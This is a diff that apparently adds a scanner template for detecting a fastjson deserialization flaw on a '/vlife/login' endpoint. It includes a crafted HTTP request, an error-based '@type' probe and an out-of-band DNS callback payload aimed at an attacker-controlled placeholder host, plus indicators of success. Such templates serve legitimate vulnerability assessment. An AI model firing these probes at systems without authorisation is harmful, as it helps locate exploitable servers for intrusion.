@@ -38,6 +38,31 @@
         "authentication": {
           "type": "none",
           "required": false
+        },
+        "request": "POST /vlife/login HTTP/1.1\nHost: {{target}}\nContent-Type: application/json\n\n{\"@type\":\"java.net.Inet4Address\",\"val\":\"{{callback}}\"}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"message\":\"com.alibaba.fastjson.JSONException: autoType is not support. java.net.Inet4Address\"}\n",
+        "payloads": [
+          {
+            "name": "Error-based detection",
+            "value": "{\"@type\":\"java.lang.Runtime\"}",
+            "note": "Triggers autoType error confirming fastjson deserialization"
+          },
+          {
+            "name": "OOB DNS callback",
+            "value": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"CALLBACK_HOST\"}",
+            "note": "Triggers DNS resolution to attacker-controlled host"
+          }
+        ],
+        "indicators": {
+          "success": [
+            "com.alibaba.fastjson.JSONException",
+            "autoType is not support",
+            "java.lang.Runtime"
+          ],
+          "failure": [
+            "Invalid credentials",
+            "Bad Request"
+          ]
         }
       }
     ],
